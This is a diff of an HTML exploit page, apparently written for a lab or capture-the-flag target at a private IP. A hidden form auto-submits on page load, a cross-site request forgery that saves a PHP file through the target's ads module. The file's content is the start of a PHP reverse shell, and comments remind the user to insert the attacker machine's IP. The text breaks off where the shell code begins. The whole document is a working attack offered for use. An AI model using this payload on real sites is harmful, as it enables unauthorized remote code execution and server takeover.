@@ -1,13 +1,11 @@
 <html>
 
 <body onload="document.exploit.submit();">
-    <form action="http://10.10.159.173/content/as/?type=ad&mode=save" method="POST" name="exploit">
-        //MAKE SURE THAT
-        //THIS LINK LOOKS EXACTLY THE SAME AS YOU CAN SEE HERE. ALSO, DON'T FORGET TO CHANGE THE IP ADDRESS TO THE IP
-        //ADDRESS OF THE ATTACKER MACHINE
-        <input type="hidden" name="adk" value="reverse" /> //change this "value" according to the name to which you save
-        session_save_path
-        your file
+    <form action="http://10.10.159.173/content/as/?type=ad&mode=save" method="POST" name="exploit"> /*MAKE SURE THAT
+        THIS LINK LOOKS EXACTLY THE SAME AS YOU CAN SEE HERE. ALSO, DON'T FORGET TO CHANGE THE IP ADDRESS TO THE IP
+        ADDRESS OF THE ATTACKER MACHINE*/
+        <input type="hidden" name="adk" value="reverse" />
+        //change this "value" according to the name to which you save your file
         <textarea type="hidden" name="adv">
         <?php
         // php-reverse-shell - A Reverse Shell implementation in PHP
